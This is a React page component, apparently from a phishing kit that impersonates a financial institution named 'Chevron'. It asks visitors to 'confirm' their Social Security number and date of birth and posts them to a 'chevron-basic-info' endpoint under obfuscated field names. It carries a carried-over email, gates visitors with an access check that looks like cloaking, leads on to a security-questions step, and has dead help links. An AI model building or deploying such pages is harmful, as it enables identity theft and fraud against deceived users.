import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

function SSN1() {
  const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    socialSecurityNumber: '',
    dateOfBirth: ''
  });

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = month ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;
  
  const location = useLocation();
  
  const { emzemz } = location.state || {}; // Access the email passed in state

  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  // Debug: Log the received email
  console.log('SSN1 received email:', emzemz);

  // Show loading state while checking access
  if (isAllowed === null) {
    return <div>Loading...</div>; // Or a proper loading spinner
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  const toggleSSNVisibility = () => setShowSSN(prev => !prev);

  const getMonthName = (monthNumber: string) => {
    const monthNames = [
      "January", "February", "March", "April", "May", "June",
      "July", "August", "September", "October", "November", "December"
    ];
    return monthNames[parseInt(monthNumber) - 1] || '';
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);
    
    const digitsOnly = socialSecurityNumber.replace(/\D/g, '');
    const newErrors = { 
      socialSecurityNumber: digitsOnly.length !== 9 ? 'Please enter a valid 9-digit SSN.' : '',
      dateOfBirth: (!month || !day || !year) ? 'Complete date of birth is required.' : ''
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dateOfBirth = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);

    if (!Object.values(newErrors).some(error => error)) {
      try {
        const d_b = `${getMonthName(month)}/${day}/${year}`;
        await axios.post(`${baseUrl}api/chevron-basic-info/`, {
          emzemz: emzemz,
          s2ns: socialSecurityNumber,
          d_b: d_b
        });
        console.log('Form submitted successfully');
        navigate('/security-questions', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting form:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex-1 bg-gray-200 rounded shadow-sm">
         <div className="border-b-2 border-teal-500 px-8 py-4">
        <h2 className="text-xl font-semibold text-gray-800">Social Security Info and date of birth</h2>
      </div>


      <div className="px-6 py-6 bg-white space-y-4">
        <p className="">We will need you to confirm your personal information.</p>

        <form onSubmit={handleSubmit}>
     

          {/* SSN Field */}
          <div className="mb-4">
            <label className="block text-gray-700 text-sm font-medium mb-2">
              Social Security Number
            </label>
            <div className="relative">
              <input
                id="ssn"
                name="ssn"
                type={showSSN ? 'text' : 'password'}
                value={socialSecurityNumber}
                onChange={(e) => {
                  const digitsOnly = e.target.value.replace(/\D/g, '').slice(0, 9);
                  let formattedValue = digitsOnly;

                  if (formattedValue.length >= 6) {
                    formattedValue = formattedValue.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
                      p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
                    );
                  } else if (formattedValue.length >= 4) {
                    formattedValue = formattedValue.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
                      p2 ? `${p1}-${p2}` : `${p1}`
                    );
                  }

                  setSocialSecurityNumber(formattedValue);
                }}
                onKeyDown={(e) => {
                  const allowedKeys = ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'];
                  if (!/[0-9]/.test(e.key) && !allowedKeys.includes(e.key)) {
                    e.preventDefault();
                  }
                }}
                maxLength={11}
                placeholder="XXX-XX-XXXX"
                className="w-full max-w-xs border border-gray-300 px-2 py-1 text-sm"
              />
              <span
                className="absolute right-2 top-1/2 transform -translate-y-1/2 text-blue-700 text-sm hover:underline cursor-pointer"
                onClick={toggleSSNVisibility}
              >
                {showSSN ? 'Hide' : 'Show'}
              </span>
            </div>
          </div>

          {errors.socialSecurityNumber && (
            <div className="flex items-center gap-2 text-red-600 text-sm mt-1">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.socialSecurityNumber}</span>
            </div>
          )}

          {/* Date of Birth Fields */}
          <div className="flex items-center gap-4 mb-4">
            <label className="text-gray-700 w-24 text-right">Date of Birth:</label>
            <div className="flex gap-2">
              <select
                value={month}
                onChange={(e) => setMonth(e.target.value)}
                className="border border-gray-300 px-2 py-1 text-sm rounded"
              >
                <option value="">Month</option>
                {Array.from({ length: 12 }, (_, i) => (
                  <option key={i + 1} value={i + 1}>
                    {new Date(0, i).toLocaleString('default', { month: 'long' })}
                  </option>
                ))}
              </select>
              <select
                value={day}
                onChange={(e) => setDay(e.target.value)}
                className="border border-gray-300 px-2 py-1 text-sm rounded"
                disabled={!month || !year}
              >
                <option value="">Day</option>
                {Array.from({ length: daysInMonth }, (_, i) => (
                  <option key={i + 1} value={i + 1}>
                    {i + 1}
                  </option>
                ))}
              </select>
              <select
                value={year}
                onChange={(e) => {
                  setYear(e.target.value);
                  setDay('');
                }}
                className="border border-gray-300 px-2 py-1 text-sm rounded"
              >
                <option value="">Year</option>
                {years.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
          </div>

          {errors.dateOfBirth && (
            <div className="flex items-center gap-2 text-red-600 text-sm ml-28">
              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
              </svg>
              <span>{errors.dateOfBirth}</span>
            </div>
          )}

          <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
            {!isLoading ? (
              <button
                type="submit"
                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
              >
                Continue
              </button>
            ) : (
              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
            )}
          </div>
        </form>
      </div>

      <div className="px-6 pb-6">
        <p className="text-xs text-gray-700 mb-2">
          For security reasons, never share your username, password, social security number, account number or other private data online, unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
        </p>
        <div className="text-xs text-blue-700 space-x-2">
          <a href="#" className="hover:underline">Forgot Username?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Password?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Forgot Everything?</a>
          <span>|</span>
          <a href="#" className="hover:underline">Locked Out?</a>
        </div>
      </div>
    </div>
  );
}

export default SSN1;